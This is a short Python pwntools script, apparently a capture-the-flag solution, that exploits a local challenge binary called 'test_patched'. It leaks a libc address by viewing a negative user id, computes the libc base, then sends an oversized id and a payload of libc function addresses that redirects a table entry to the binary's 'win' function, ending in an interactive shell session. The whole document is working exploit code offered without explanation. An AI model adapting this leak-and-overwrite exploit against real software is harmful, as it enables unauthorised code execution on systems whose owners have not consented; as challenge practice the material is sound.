# Script python

    #!/usr/bin/env python3
    from pwn import *
    context.binary=exe=ELF('./test_patched',checksec=False)
    libc=ELF('./libc.so.6')
    
    p=process(exe.path)
    
    p.sendafter(b'First, create a user.',b'zyan')
    p.sendlineafter(b'Input your choice:',b'2')
    p.sendlineafter(b'Input id to view: ',b'-2')
    p.recvuntil(b'Name: ')
    libc_leak=u64(p.recv(6)+b'\x00\x00')
    libc.address=libc_leak-0x606f0
    print(hex(libc_leak))
    
    one_gadget=libc.address+0xebc41
    
    payload=p64(libc.sym['setbuf'])
    payload+=p64(libc.sym['system'])
    payload+=p64(libc.sym['printf'])
    payload+=p64(libc.sym['memset'])
    payload+=p64(libc.sym['read'])
    payload+=p64(libc.sym['fopen'])
    payload+=p64(libc.sym['perror'])
    payload+=p64(libc.sym['__isoc99_scanf'])
    payload+=p64(exe.sym['win'])
    
    p.sendlineafter(b'Input your choice:',b'1')
    p.sendlineafter(b'id',str(0x333333333333331).encode())
    p.sendafter(b'name',payload)
    
    p.sendlineafter(b'Input your choice:',b'4')

p.interactive()
